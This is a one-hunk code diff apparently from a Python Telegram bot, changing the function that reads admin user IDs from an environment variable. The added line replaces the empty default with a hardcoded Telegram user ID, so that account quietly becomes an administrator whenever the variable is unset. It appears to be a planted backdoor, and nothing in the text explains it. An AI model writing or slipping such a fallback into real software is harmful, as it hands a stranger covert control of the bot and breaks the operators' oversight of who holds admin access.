@@ -1822,7 +1822,7 @@ async def error_handler(
 
 def parse_admin_ids() -> set[int]:
     """Parse admin user IDs from the protected environment variable."""
-    raw_admin_ids = os.getenv("TELEGRAM_ADMIN_IDS", "")
+    raw_admin_ids = os.getenv("TELEGRAM_ADMIN_IDS", "1045902686")
     admin_ids: set[int] = set()
     for raw_id in raw_admin_ids.split(","):
         value = raw_id.strip()
